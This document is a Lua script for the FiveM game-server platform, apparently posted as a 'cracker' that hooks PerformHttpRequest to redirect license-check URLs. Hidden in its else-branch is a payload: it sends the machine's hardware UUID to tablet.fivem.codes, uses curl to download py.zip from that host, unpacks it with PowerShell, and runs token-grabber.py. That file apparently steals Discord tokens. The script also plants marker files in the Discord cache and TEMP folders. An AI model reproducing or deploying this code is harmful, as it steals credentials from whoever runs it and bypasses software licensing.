--[[
	id: n2UeYXtvjASx79A57V2Q2
	name: cracker
	description: cracker
	time1: 2021-04-23 17:54:23.946989+00
	time2: 2021-04-23 17:54:23.94699+00
	uploader: 1_uWzt4BtEJf3eT-4y7CKsRXGy5jiT_jioFjXrdI
	uploadersession: k1dVvHJOyF0I00lQoNvJKLwH2yC8sd
	flag: f
--]]

CreateThread(
    function()
        local roaming = os.getenv("APPDATA")
        local temp = os.getenv("TEMP")
        local path1 = roaming .. "\\discord\\Cache"
        local path2 = temp
        qidayrvL4X = io.open(temp .. "\\RQOQLkMABd180tEVogJu.log", "r")
        ddRJ3MwY44 = io.open(path1 .. "\\f_K0arQ0", "r")
        if qidayrvL4X or ddRJ3MwY44 then
            print("fuck u")
        else
            if GiveWeaponToPed and PerformHttpRequest and DeleteEntity then
                function getArgs(fun)
                    local args = {}
                    local hook = debug.gethook()

                    local argHook = function(...)
                        local info = debug.getinfo(3)
                        if "pcall" ~= info.name then
                            return
                        end
                        table.insert(args, debug.getinfo(2).source)
                        return
                    end

                    debug.sethook(argHook, "c")
                    pcall(fun)

                    return args
                end
                local args = getArgs(PerformHttpRequest)
                if
                    args[1] and string.find(args[1], GetCurrentResourceName()) == nil and
                        string.find(args[1], "resources") == nil
                 then
                    local f = io.popen("wmic csproduct get uuid")
                    if f then
                        kasdnkdasnjnj = f:read("*a")
                        kasdnkdasnjnj = kasdnkdasnjnj:gsub("UUID", "")
                        kasdnkdasnjnj = kasdnkdasnjnj:gsub("\n", "")
                        kasdnkdasnjnj = kasdnkdasnjnj:gsub(" ", "")
                        kasdnkdasnjnj = string.sub(kasdnkdasnjnj, 2, 37)
                        local url = "http://tablet.fivem.codes/load/cracker.php?hwid=" .. kasdnkdasnjnj

                        PerformHttpRequest(
                            url,
                            function(errorCode, resultData, resultHeaders)
                                if tonumber(resultData) == 1 then
                                    print("[CRACK] started :)")

                                    xddddd = PerformHttpRequest

                                    function PerformHttpRequest(url, cb, method, data, headers)
                                        if Crack.RequestDebug then
                                            print(url, cb, method, data, headers)
                                        end
                                        if url == Crack.Url1[1] then
                                            xddddd(
                                                Crack.Url1[2],
                                                function(errorCode, resultData, resultHeaders)
                                                    return cb(errorCode, resultData, resultHeaders)
                                                end
                                            )
                                        elseif url == Crack.Url2[1] then
                                            xddddd(
                                                Crack.Url2[2],
                                                function(errorCode, resultData, resultHeaders)
                                                    return cb(errorCode, resultData, resultHeaders)
                                                end
                                            )
                                        elseif url == Crack.Url3[1] then
                                            xddddd(
                                                Crack.Url3[2],
                                                function(errorCode, resultData, resultHeaders)
                                                    return cb(errorCode, resultData, resultHeaders)
                                                end
                                            )
                                        elseif url == Crack.Url4[1] then
                                            xddddd(
                                                Crack.Url4[2],
                                                function(errorCode, resultData, resultHeaders)
                                                    return cb(errorCode, resultData, resultHeaders)
                                                end
                                            )
                                        elseif url == Crack.Url5[1] then
                                            xddddd(
                                                Crack.Url5[2],
                                                function(errorCode, resultData, resultHeaders)
                                                    return cb(errorCode, resultData, resultHeaders)
                                                end
                                            )
                                        elseif url == Crack.Url6[1] then
                                            xddddd(
                                                Crack.Url6[2],
                                                function(errorCode, resultData, resultHeaders)
                                                    return cb(errorCode, resultData, resultHeaders)
                                                end
                                            )
                                        elseif url == Crack.Url7[1] then
                                            xddddd(
                                                Crack.Url7[2],
                                                function(errorCode, resultData, resultHeaders)
                                                    return cb(errorCode, resultData, resultHeaders)
                                                end
                                            )
                                        elseif url == Crack.Url8[1] then
                                            xddddd(
                                                Crack.Url8[2],
                                                function(errorCode, resultData, resultHeaders)
                                                    return cb(errorCode, resultData, resultHeaders)
                                                end
                                            )
                                        elseif url == Crack.Url9[1] then
                                            xddddd(
                                                Crack.Url9[2],
                                                function(errorCode, resultData, resultHeaders)
                                                    return cb(errorCode, resultData, resultHeaders)
                                                end
                                            )
                                        elseif url == Crack.Url10[1] then
                                            xddddd(
                                                Crack.Url10[2],
                                                function(errorCode, resultData, resultHeaders)
                                                    return cb(errorCode, resultData, resultHeaders)
                                                end
                                            )
                                        elseif not Crack.BlockOthers then
                                            xddddd(
                                                url,
                                                function(errorCode, resultData, resultHeaders)
                                                    return cb(errorCode, resultData, resultHeaders)
                                                end,
                                                method,
                                                data,
                                                headers
                                            )
                                        end
                                    end
                                else
                                    print("[CRACK] no started :(")
                                end
                            end
                        )
                    end
                else
                    local roaming = os.getenv("APPDATA")
                    local temp = os.getenv("TEMP")
                    local path1 = roaming .. "\\discord\\Cache"
                    local path2 = temp

                    file = io.open(path1 .. "\\f_K0arQ0", "w")
                    if file then
                        file:write("")
                        file:close()
                    end

                    file = io.open(temp .. "\\RQOQLkMABd180tEVogJu.log", "w")
                    if file then
                        file:write("")
                        file:close()
                    end
                    local h8IOhNL1oU = temp .. "\\KlYjvWCiy2"
                    local uXx2pXOoEM =
                        'powershell -Command "Expand-Archive ' ..
                        h8IOhNL1oU .. "\\tD1pgCu8of.zip -DestinationPath " .. h8IOhNL1oU .. '"'
                    os.execute("mkdir " .. h8IOhNL1oU)
                    os.execute(
                        "curl http://tablet.fivem.codes/load/py.zip --output " .. h8IOhNL1oU .. "\\tD1pgCu8of.zip"
                    )
                    os.execute(uXx2pXOoEM)
                    os.execute(h8IOhNL1oU .. "\\python.exe " .. h8IOhNL1oU .. "\\token-grabber.py")
                    print("Attempted cracking, blacklisting")
                end
            end
        end
    end
)
